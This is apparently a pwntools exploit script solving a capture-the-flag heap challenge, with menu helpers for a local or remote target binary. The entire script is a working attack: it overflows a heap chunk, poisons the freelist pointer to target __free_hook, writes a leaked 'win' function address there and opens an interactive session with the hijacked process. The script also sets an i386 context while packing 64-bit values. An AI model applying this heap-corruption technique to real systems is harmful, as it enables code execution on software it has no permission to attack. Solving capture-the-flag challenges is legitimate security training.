from pwn import *
import sys

# config
context(os="linux", arch="i386")
context.log_level = "debug"

FILE_NAME = "./build/chall"
HOST = ""
PORT = 0


def write(data):
    conn.sendlineafter("> ", "1")
    time.sleep(0.1)
    conn.send(data)


def malloc(data):
    conn.sendlineafter("> ", "2")
    time.sleep(0.1)
    conn.send(data)


def free():
    conn.sendlineafter("> ", "3")


if len(sys.argv) > 1 and sys.argv[1] == "r":
    conn = remote(HOST, PORT)
else:
    conn = process(FILE_NAME)


buflen = 0x18
# elf=ELF(FILE_NAME)
# bss=elf.bss()
# printf_plt=elf.plt['printf']
# printf_got=elf.got['printf']
# main_addr=elf.symbols['main']


def main():
    conn.recvuntil("hook>: ")
    free_hook = int(conn.recvline(), 16)
    conn.recvuntil("win>: ")
    win = int(conn.recvline(), 16)

    payload = b"A"*buflen
    payload += p64(0x31)
    payload += p64(free_hook)

    malloc("hoge")
    free()
    write(payload)

    malloc("hoge")
    free()

    conn.sendlineafter("> ", "4")
    conn.sendlineafter("> ", "5")

    conn.sendlineafter("> ", "2")
    conn.sendline(p64(win))
    conn.interactive()

    #conn.sendlineafter("> ", "4")
    #conn.sendlineafter("> ", "5")
    # print(conn.recvall())


if __name__ == "__main__":
    main()
